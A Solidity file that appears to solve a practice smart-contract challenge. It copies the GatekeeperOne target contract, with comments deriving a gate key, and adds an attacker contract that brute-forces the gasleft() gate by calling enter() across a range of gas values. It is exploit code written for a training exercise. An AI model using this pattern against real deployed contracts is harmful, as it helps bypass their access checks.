// SPDX-License-Identifier: MIT

/*
  Create the exact same environment to debug the opcodes. This is necessary as we have
  no idea what gasleft() will return. This experiment will give us a *rough* value on
  how much gas is left during 'gateOne'.
*/
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    // Bits 16 to 32 must be zero => 00000000000000000000000000000000
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    // Bits 32 to 64 must have at least one non-zero bit => 00000000000000000000000000000001 00000000000000000000000000000000
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    // First 16 bits must be the LAST 16 bits of my address
    // Address I used ended as e3ab, which corresponds to 1110001110101011
    // Hence, _gateKey = 00000000000000000000000000000001 00000000000000001110001110101011
    // Which is also 0x0x000000010000E3AB
    require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

// Attacker contract
contract GateFucker {
  function enterGate(address pf, bytes8 arg, uint256 _gas) external returns (bool) {
    /*
      Although we found a reasonable gasleft() value after we debug our own same-looking
      'Gatekeeper' contract, there might be differences. That's why it's a good idea to
      iterate a range of values and try each out.
    */
    for(uint256 i=_gas-128; i<_gas+128; i++) {
      (bool success, ) = address(pf).call.gas(i)(abi.encodeWithSignature("enter(bytes8)", arg));
      if (success) return true;
    }
    return false;
  }
}
